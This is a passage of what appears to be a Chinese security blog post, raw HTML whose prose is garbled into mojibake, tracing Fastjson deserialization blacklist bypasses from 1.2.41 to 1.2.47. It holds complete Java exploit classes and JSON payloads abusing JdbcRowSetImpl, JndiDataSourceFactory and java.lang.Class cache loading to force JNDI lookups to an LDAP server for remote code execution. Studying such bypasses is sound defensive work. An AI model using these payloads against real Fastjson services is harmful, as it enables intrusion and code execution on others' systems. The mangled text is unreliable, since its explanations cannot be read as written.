class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000869.png" alt="image-20230828000012407"><br>å’Œä¹‹å‰çš„åŒºåˆ«å°±æ˜¯å¼€å¯äº†autoTypeSupportç„¶ååœ¨<code>com.sun.rowset.JdbcRowSetImpl</code>å¼€å¤´åŠ äº†ä¸ª<code>L</code>ç»“å°¾åŠ ä¸ª<code>;</code>è¿™æ ·å°±ç»•è¿‡äº†<br>ä¸‹é¢è°ƒè¯•ä¸€ä¸‹ï¼Œè¿™é‡Œçš„<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>ç±»æ˜¯ä¸å­˜åœ¨çš„<br>è¿™é‡Œå¯ä»¥çœ‹åˆ°autoTypeSupportå·²ç»å˜ä¸ºtrueäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000553.png" alt="image-20230828000033226"><br>ç„¶åæ¥åˆ°äº†é»‘åå•æ ¡éªŒ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000542.png" alt="image-20230828000052244"><br>è¿™é‡Œä¼šä¸€ä¸ªä¸ªæ£€éªŒæœ€ç»ˆæ£€éªŒä¸åˆ°è·³å‡ºï¼Œå¯ä»¥è‡ªå·±æ‰‹åŠ¨è·³å‡ºä¸ç„¶ä¼šåˆ¤æ–­å¾ˆä¹…ï¼Œç„¶åç»§ç»­å¾€ä¸‹æ¥åˆ°ä¸‹é¢è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001155.png" alt="image-20230828000106862"><br>è¿›å…¥è¿™ä¸ªloadClassï¼Œåœ¨ä¸‹é¢è¿™é‡Œä¼šå¯¹ç±»è¿›è¡Œåˆ¤æ–­å¦‚æœç±»çš„é¦–å°¾æ˜¯<code>L</code>å’Œ<code>;</code>åå»æ‰é¦–å°¾å˜ä¸º<code>com.sun.rowset.JdbcRowSetImpl</code>å‚¨å­˜åœ¨newClassName<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001776.png" alt="image-20230828000134596"><br>æœ€ç»ˆåœ¨ä¸‹é¢ä¸‹é¢è¿™é‡Œè¿”å›clazzå³<code>com.sun.rowset.JdbcRowSetImpl</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001183.png" alt="image-20230828000147996"><br>åé¢å°±å’Œä¹‹å‰çš„å·®ä¸å¤šäº†</p><h2 id="1-2-25-1-2-42-ç»•è¿‡"><a href="#1-2-25-1-2-42-ç»•è¿‡" class="headerlink" title="1.2.25~1.2.42 ç»•è¿‡"></a>1.2.25~1.2.42 ç»•è¿‡</h2><p>åœ¨1.2.42ç‰ˆæœ¬å‘ç°ä¸Šé¢çš„è¿™ä¸ªexpæ‰“ä¸é€šäº†ï¼Œæ–°çš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒè¯•çœ‹ä¸€ä¸‹ï¼Œåœ¨ä¸‹é¢è¿™é‡Œè°ƒç”¨äº†<code>checkAutoType</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002478.png" alt="image-20230828000205928"><br>è·Ÿè¿›å»çœ‹ä¸€ä¸‹ï¼Œåœ¨ä¸‹é¢è¿™é‡Œæˆ‘ä»¬å‘ç°ç±»åå˜ä¸ºäº†<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>å°‘äº†ä¸ª<code>L</code>å’Œ<code>;</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002312.png" alt="image-20230828000223809"><br>è¿”å›çœ‹ä¸‹å¤„ç†é€»è¾‘ï¼Œå‘ç°è¿™é‡Œçš„å¤„ç†é€»è¾‘ä¸å†æ˜¯æ˜æ–‡ï¼Œé‡‡ç”¨äº†åŠ å¯†æ··æ·†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002998.png" alt="image-20230828000242717"><br>å¹¶ä¸”é»‘åå•ä¹Ÿå˜ä¸ºäº†å¦‚ä¸‹å½¢å¼<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002931.png" alt="image-20230828000257574"><br>FastjsonæŠŠåŸæœ¬æ˜æ–‡å½¢å¼çš„é»‘åå•æ”¹æˆäº†å“ˆå¸Œè¿‡çš„é»‘åå•ï¼Œä½†æ˜¯æœ‰äººå·²åœ¨Githubä¸Šè·‘å‡ºäº†å¤§éƒ¨åˆ†é»‘åå•åŒ…ç±»ï¼š<br><a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist (github.com)</a><br>å®é™…ä¸Šå°±æ˜¯å¦‚æœç±»åé¦–å°¾å­˜åœ¨<code>L</code>å’Œ<code>;</code>å°±ä¼šè¿›è¡Œå»é™¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280003632.png" alt="image-20230828000322073"><br>å¯ä»¥çœ‹åˆ°æ­¤æ—¶<code>className</code>å˜ä¸ºäº†<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>æœ€ç»ˆä¼šèµ°åˆ°ä¸‹é¢è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280003168.png" alt="image-20230828000344652"><br>åé¢çš„å¤„ç†æ­¥éª¤å°±å’Œ1.2.41ä¸€æ ·äº†ï¼Œè¿™é‡Œä¿®å¤çš„æ„Ÿè§‰å’Œæˆ‘å¹³æ—¶åšäº‹ä¸€æ ·ï¼Œè€ƒè™‘ä¸å…¨åªå»é™¤äº†ä¸€æ¬¡<code>L</code>å’Œ<code>;</code></p><h2 id="1-2-25-1-2-43-ç»•è¿‡"><a href="#1-2-25-1-2-43-ç»•è¿‡" class="headerlink" title="1.2.25~1.2.43 ç»•è¿‡"></a>1.2.25~1.2.43 ç»•è¿‡</h2><p>è¿™é‡Œä¸Šé¢çš„expå·²ç»æ‰“ä¸é€šäº†ï¼Œä¸è¿‡å…ˆæ‹¿é‚£ä¸ªè°ƒä¸€ä¸‹çœ‹çœ‹åœ¨43ç‰ˆæœ¬æ˜¯æ€ä¹ˆå¤„ç†çš„<br>é¦–å…ˆæ˜¯ä¸‹é¢è¿™é‡Œçš„åˆ¤æ–­ï¼Œä¸Šé¢å¿˜è®°è¯´äº†ï¼Œç±»åé•¿åº¦ä¸èƒ½è¶…è¿‡128ä¸”ä¸èƒ½å°äº3å¦åˆ™æŠ›å‡ºå¼‚å¸¸<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004334.png" alt="image-20230828000404217"><br>å¯ä»¥çœ‹åˆ°åœ¨ä¸‹é¢è¿™é‡Œç›´æ¥æŠ›å‡ºäº†å¼‚å¸¸<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004636.png" alt="image-20230828000423114"><br>åœ¨ç¬¬äºŒä¸ªifä¸­å¯¹ä»¥LLå¼€å¤´çš„ç±»ç›´æ¥æŠ›å‡ºå¼‚å¸¸<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004731.png" alt="image-20230828000440591"><br>åœ¨<code>TypeUtils.loadClass</code>ä¸­è¿˜æœ‰ä¸ªå¯¹ä»¥<code>[</code>å¼€å¤´çš„ç±»è¿›è¡ŒåŠ è½½<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004881.png" alt="image-20230828000452772"><br>é‚£ä¹ˆå°†expæ”¹ä¸‹ä»¥<code>[</code>å¼€å¤´è‡ªç„¶å°±èƒ½ç»•è¿‡ä¸Šé¢çš„ifæ£€æµ‹ï¼Œç„¶åç»§ç»­è°ƒè¯•æ¥åˆ°ä¸‹é¢è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005032.png" alt="image-20230828000506507"><br>ç»è¿‡è°ƒè¯•å‘ç°åªæ˜¯åŠ ä¸ª<code>[</code>è™½ç„¶èƒ½è¿‡æ£€æµ‹ä½†æ˜¯æ— æ³•å¼¹å‡ºè®¡ç®—å™¨ä¸”ä¼šæŠ¥å¦‚ä¸‹çš„é”™è¯¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005738.png" alt="image-20230828000523575"><br>ä¸Šé¢è¿”å›çš„ç±»åæ˜¯<code>[com.sun.rowset.JdbcRowSetImpl</code>åé¢è¦å®Œæˆçš„æ˜¯ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜åº”è¯¥å°±æ˜¯å‡ºåœ¨ååºåˆ—åŒ–çš„æ­¥éª¤ï¼Œç»§ç»­è°ƒè¯•ï¼Œåœ¨ä¸‹é¢è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿”å›çš„clazzæ˜¯<code>[Lcom.sun.rowset.JdbcRowSetImpl;</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005550.png" alt="image-20230828000538012"><br>æ‰¾åˆ°äº†æŠ›å‡ºå¼‚å¸¸çš„ä½ç½®åœ¨<code>parseArray</code>æ–¹æ³•ä¸­<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005509.png" alt="image-20230828000557991"><br>é‚£ä¹ˆè§£å†³è¿™ä¸ªæŠ¥é”™é—®é¢˜æ˜¯ä¸æ˜¯å°±è¡Œäº†å‘¢ï¼Ÿå…ˆè¯•è¯•ï¼Œè§£å†³æŠ¥é”™æ ¹æ®ä¸Šé¢çš„æŠ¥é”™æ”¹ï¼Œä¸Šé¢çš„æŠ¥é”™å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exepct <span class="string">&#x27;[&#x27;</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1099/ExportObject&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>åœ¨42çš„ä½ç½®æœŸå¾…æ˜¯<code>[</code>ä½†æ˜¯ä¸º<code>,</code>é‚£ä¹ˆæŠŠexpæ”¹ä¸ºå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™æ¬¡åˆæŠ¥é”™äº†ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure><p>åœ¨43çš„ä½ç½®æœŸå¾…ä¸º<code>&#123;</code>é‚£ä¹ˆåŠ ä¸ªçœ‹çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¼¹å‡ºè®¡ç®—å™¨æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006164.png" alt="image-20230828000622738"><br>expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-25-1-2-45ç»•è¿‡"><a href="#1-2-25-1-2-45ç»•è¿‡" class="headerlink" title="1.2.25~1.2.45ç»•è¿‡"></a>1.2.25~1.2.45ç»•è¿‡</h2><p>åœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼Œåˆ©ç”¨çš„æ˜¯<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>å¯¹é»‘åå•ç»•è¿‡ï¼Œä½†æ˜¯æœ‰ä¸€å®šçš„å‰ææ¡ä»¶<br><strong>å‰ææ¡ä»¶ï¼šéœ€è¦ç›®æ ‡æœåŠ¡ç«¯å­˜åœ¨mybatisçš„jaråŒ…ï¼Œä¸”ç‰ˆæœ¬éœ€ä¸º3.x.xç³»åˆ—&lt;3.5.0çš„ç‰ˆæœ¬ã€‚</strong><br>è¿™é‡Œldapå’Œrmiéƒ½èƒ½æ‰“ï¼Œæ¢ä¸ªåè®®å°±è¡Œï¼Œæœ¬åœ°çš„è¯serverå½“ç„¶å°±è¦èµ·rmiçš„äº†<br>å¯¼å…¥mybatisçš„ä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">3.4</span><span class="number">.4</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass45</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006203.png" alt="image-20230828000637764"><br>ä¸‹é¢è°ƒè¯•çœ‹ä¸€ä¸‹ï¼Œå¦‚ä¸‹å¯ä»¥çœ‹åˆ°ç±»åå¦‚æœä»¥<code>[</code>å¼€å¤´ç›´æ¥æŠ›å‡ºå¼‚å¸¸ç»“æŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006859.png" alt="image-20230828000653345"><br>ä¸‹é¢è¿™é‡Œç”±äº<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>ä¸åœ¨é»‘åå•è¿›è€Œç»•è¿‡æ£€æµ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007332.png" alt="image-20230828000710816"><br>ç„¶åå°±ç®—å¯¹è¿™ä¸ªç±»çš„åˆ©ç”¨åˆ†æï¼Œé€šè¿‡expå¯ä»¥çœ‹åˆ°æ˜¯å¯¹propertieså±æ€§çš„åˆ©ç”¨ï¼Œç”±äºåœ¨<code>deserialze</code>æ–¹æ³•ä¸‹ä¸å¤ªå¥½è°ƒï¼ˆæŠ€æœ¯å¤ªèœï¼‰ç›´æ¥æ¥åˆ°<code>JndiDataSourceFactory</code>ç±»ä¸‹ï¼Œçœ‹åˆ°å­˜åœ¨setteræ–¹æ³•ä¸º<code>setProperties()</code>fastjsonèƒ½å¤Ÿè‡ªåŠ¨è°ƒç”¨ï¼Œç›´æ¥åœ¨è¯¥setteræ–¹æ³•æ‰“æ–­ç‚¹ï¼Œç„¶åå°±æ˜¯å­˜åœ¨JNDIæ³¨å…¥äº†ï¼Œå³<code>InitialContext.lookup()</code>ï¼Œå…¶ä¸­å‚æ•°ç”±æˆ‘ä»¬è¾“å…¥çš„propertieså±æ€§ä¸­çš„data_sourceå€¼è·å–çš„ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007822.png" alt="image-20230828000726311"></p><h2 id="1-2-25-1-2-47ç»•è¿‡"><a href="#1-2-25-1-2-47ç»•è¿‡" class="headerlink" title="1.2.25~1.2.47ç»•è¿‡"></a>1.2.25~1.2.47ç»•è¿‡</h2><p>åœ¨1.2.47ç‰ˆæœ¬ä¸­ä¸Šé¢çš„expåˆä¸è¡Œäº†ï¼ŒåŸå› æ˜¯è¿™ä¸ªç±»åˆ°é»‘åå•å»äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007057.png" alt="image-20230828000743553"><br>è¿™æ¬¡åˆ©ç”¨çš„æ˜¯ä¹‹å‰çš„payloadåœ¨é»˜è®¤ä¸å¼€å¯AutoTypeSupportçš„æƒ…å†µä¸‹é€šè¿‡ç¼“å­˜åŠ è½½<code>JdbcRowSetImpl</code>ç±»ï¼Œexpå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass47</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008657.png" alt="image-20230828000800194"><br>ç»§ç»­è°ƒè¯•ä¸€ä¸‹ï¼Œåœ¨è¿™é‡Œå°±å¯ä»¥ç»“åˆç€ç»„é•¿çš„é‚£ä¸ªå›¾æ¥åˆ†æäº†</p><ul><li><p>åœ¨ç¬¬ä¸€ä¸ªä¸­ï¼Œå› ä¸ºåœ¨ç™½åå•ä¸­æ‰èƒ½å¤Ÿè¿›è¡Œç¼“å­˜ï¼Œæ‰€ä»¥è¿™é‡Œä¸ç¬¦åˆè¦æ±‚ï¼Œç¬¬ä¸‰ä¸ªåŒç†</p></li><li><p>åœ¨ç¬¬äºŒä¸ªè¿”å›ç±»å½“ä¸­ï¼ŒæœŸæœ›ç±»ä¸ºç©ºä¸”ç±»ä¸æœŸæœ›ç±»ä¸€è‡´çš„æ—¶å€™è¿”å›ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬çš„æœŸæœ›ç±»ä¸ºç©ºï¼Œæ‰€ä»¥è¿™é‡Œèƒ½å¤Ÿç¬¦åˆæ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å¾€ä¸Šæ‰¾ï¼Œåªè¦ç¼“å­˜ä¸­å­˜åœ¨ç±»ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè¿›è¡ŒåŠ è½½ã€‚</p></li><li><p>ç¬¬å››ä¸ªæ˜¯åŸºäºæœŸæœ›ç±»çš„ï¼Œå› ä¸ºè¿™é‡Œå’ŒæœŸæœ›ç±»å¹¶æ— å…³æ‰€ä»¥ä¹Ÿæ»¡è¶³ä¸äº†</p></li><li><p>è¿›å…¥falseæ¥åˆ°ç¬¬äº”ä¸ªï¼Œåˆå› ä¸ºé»˜è®¤æƒ…å†µä¸‹AutoTypeä¸ºfalseï¼Œæ‰€ä»¥ä¹ŸåŠ è½½ä¸äº†<br>æ‰€ä»¥ç°åœ¨å°±åœ¨ç¼“å­˜è¿™å—ä¸‹åŠŸå¤«ï¼Œçœ‹ä¸€ä¸‹å¦‚ä½•åœ¨ç¼“å­˜é‡Œé¢æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç±»ï¼Œè¿™ä¸€å—å„¿çš„æµç¨‹å¦‚ä¸‹å›¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008433.png" alt="image-20230828000816375"><br>ç”±äºAutoTypeä¸ºfalseæ‰€ä»¥ä¸ä¼šè¿›å…¥ç¬¬ä¸€è½®çš„é»‘åå•æ£€æµ‹æ¥åˆ°<code>TypeUtils.getClassFromMapping</code>è·Ÿè¿›æ¥çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008797.png" alt="image-20230828000829713"><br>å‘ç°æ˜¯ä»mappingsé‡Œé¢æ‰¾ç¼“å­˜ï¼Œç„¶åfind uagesçœ‹çœ‹mappingsä»€ä¹ˆæ—¶å€™èµ‹å€¼ï¼Œå¤ç°è¿›è¡Œèµ‹å€¼çš„åœ°æ–¹å¾ˆå¤šï¼Œä½†æ˜¯å¤§å¤šæ˜¯æŒ‡å®šäº†ä¸€äº›åŸºç¡€ç±»è¿›è¡Œçš„ç¼“å­˜è€ŒloadClassè¿™é‡Œåªè¦æˆ‘ä»¬åŠ è½½ç±»æˆåŠŸä»¥åï¼Œä»–å°±ä¼šæ”¾å…¥ç¼“å­˜ä¸­ï¼Œä¸‹æ¬¡è°ƒç”¨ç›´æ¥ä»ç¼“å­˜ä¸­è¿›è¡ŒåŠ è½½ï¼Œè¿™é‡Œæˆ‘ä»¬å°±è¦æƒ³æ€ä¹ˆæ‰èƒ½å¤Ÿåœ¨loadClassçš„æ—¶å€™å°†æˆ‘ä»¬çš„ç±»åŠ è½½å…¥ç¼“å­˜å½“ä¸­<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008627.png" alt="image-20230828000844112"><br>ç„¶åç»§ç»­å¯»æ‰¾loadClassçš„è°ƒç”¨ï¼Œæœ€ç»ˆæ˜¯æ‰¾åˆ°äº†MiscCodecè¿™ä¸ªç±»ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘find uagesçš„æ—¶å€™æ‰¾ä¸åˆ°ï¼Œå¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008818.png" alt="image-20230828000858293"><br>æ²¡åŠæ³•åªèƒ½æ‰‹åŠ¨è¿›å…¥äº†ï¼Œåœ¨<code>MiscCodec.deserialze()</code>ä¸­è¿›è¡Œè°ƒç”¨å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009792.png" alt="image-20230828000915703"><br>ç°åœ¨æ¥çœ‹çœ‹è¿™ä¸ªMiscCodecæ˜¯ä¸ªä»€ä¹ˆï¼Œå‘ç°å®ƒå®ç°äº†åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æ¥å£åœ¨fastJsonçš„ååºåˆ—åŒ–ä¸­ä¹Ÿä¼šæŠŠä»–å½“ä½œååºåˆ—åŒ–å™¨æ¥è¿›è¡Œè°ƒç”¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009894.png" alt="image-20230828000925778"><br>æ‰€ä»¥å¦‚æœFastJsonååºåˆ—åŒ–çš„ç±»æ˜¯å±äºClass.classçš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨MiscCodecååºåˆ—åŒ–å™¨ï¼Œç„¶åè°ƒç”¨loadClassï¼Œåœ¨ä¼ å…¥æˆ‘ä»¬æƒ³ä¼ å…¥çš„å­—ç¬¦ä¸²strValåloadClasså°±ä¼šå°†å­—ç¬¦ä¸²ä½œä¸ºString classNameè¿›è¡ŒåŠ è½½å¹¶æ”¾åœ¨ç¼“å­˜é‡Œé¢ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009849.png" alt="image-20230828000938335"><br>ç„¶åè¿™é‡Œçš„æœ‰ä¸ªæ£€æµ‹è¦æ»¡è¶³ä¸ç„¶å°±ä¼šæŠ›å¼‚å¸¸ï¼Œå³strValçš„é”®æ˜¯å¦ä¸ºvalæ˜¯çš„è¯å†æå–å®ƒçš„å€¼<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009092.png" alt="image-20230828000951923"><br>ç„¶åèµ‹å€¼åˆ°objValä¸Š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010262.png" alt="image-20230828001004053"><br>æœ€åèµ‹å€¼ç»™strVal<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010150.png" alt="image-20230828001017952"><br>ç„¶ååœ¨ç¼“å­˜é‡Œé¢æ‰¾åˆ°<code>com.sun.rowset.JdbcRowSetImpl</code>è¿”å›clazz<br><img 